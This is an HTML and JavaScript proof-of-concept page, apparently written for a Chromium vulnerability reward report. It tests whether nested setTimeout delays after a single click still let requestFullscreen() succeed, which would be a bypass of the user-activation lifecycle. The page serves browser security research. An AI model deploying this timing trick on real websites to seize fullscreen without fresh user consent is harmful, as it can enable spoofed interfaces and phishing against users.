<!DOCTYPE html>
<html>
<head>
    <title>VRP PoC: Activation Lifecycle Bypass</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; text-align: center; padding-top: 50px; background: #0f172a; color: #f1f5f9; }
        #box { border: 1px solid #334155; padding: 40px; display: inline-block; border-radius: 20px; background: #1e293b; box-shadow: 0 10px 25px rgba(0,0,0,0.3); }
        #timer { font-size: 64px; font-weight: 800; margin: 20px 0; color: #38bdf8; font-family: monospace; }
        #status { font-size: 18px; margin-bottom: 25px; color: #94a3b8; min-height: 60px; }
        button { padding: 18px 36px; font-size: 20px; font-weight: bold; cursor: pointer; background: #2563eb; color: white; border: none; border-radius: 12px; transition: 0.3s; }
        button:hover { background: #1d4ed8; transform: translateY(-2px); }
        .success { color: #4ade80; font-weight: bold; line-height: 1.6; }
        .fail { color: #f87171; font-weight: bold; }
        .step-log { font-size: 12px; color: #64748b; margin-top: 10px; font-family: monospace; }
    </style>
</head>
<body>

<div id="box">
    <h2 style="margin-top:0">Chromium Security Research</h2>
    <div id="status">Waiting for user activation...</div>
    <div id="timer">0ms</div>
    <button id="runTest">START NESTED TEST</button>
    <div id="stepLog" class="step-log"></div>
</div>

<script>
    const btn = document.getElementById('runTest');
    const timerDisplay = document.getElementById('timer');
    const statusDisplay = document.getElementById('status');
    const stepLog = document.getElementById('stepLog');
    let start;

    btn.onclick = () => {
        start = performance.now();
        btn.style.opacity = '0';
        btn.style.pointerEvents = 'none';
        statusDisplay.innerText = "Running... DO NOT TOUCH the screen.";
        
        const interval = setInterval(() => {
            const now = Math.round(performance.now() - start);
            timerDisplay.innerText = `${now}ms`;
        }, 10);

        // --- STEP 1: INITIAL DELAY ---
        stepLog.innerText = "Step 1: 2000ms delay started...";
        setTimeout(() => {
            
            // --- STEP 2: NESTED DELAY ---
            stepLog.innerText = "Step 2: 1500ms NESTED delay scheduled...";
            setTimeout(() => {
                
                const callTime = Math.round(performance.now() - start);
                statusDisplay.innerText = `Calling requestFullscreen() at ${callTime}ms...`;

                // --- SENSITIVE API CALL ---
                document.documentElement.requestFullscreen()
                .then(() => {
                    const resolveTime = Math.round(performance.now() - start);
                    clearInterval(interval);
                    timerDisplay.innerText = `${resolveTime}ms`;
                    statusDisplay.innerHTML = `
                        <span class="success">
                            FULLSCREEN GRANTED<br>
                            INVOKED AT: ${callTime}ms<br>
                            RESOLVED AT: ${resolveTime}ms
                        </span>
                    `;
                    stepLog.innerText = "Result: Fullscreen allowed after extended delay.";
                })
                .catch((e) => {
                    clearInterval(interval);
                    const failTime = Math.round(performance.now() - start);
                    statusDisplay.innerHTML = `<span class="fail">BLOCKED: ${e.message}<br>Attempted at ${failTime}ms</span>`;
                    stepLog.innerText = "Result: No leak detected.";
                });

            }, 1500); 

        }, 2000);
    };
</script>
</body>
</html>
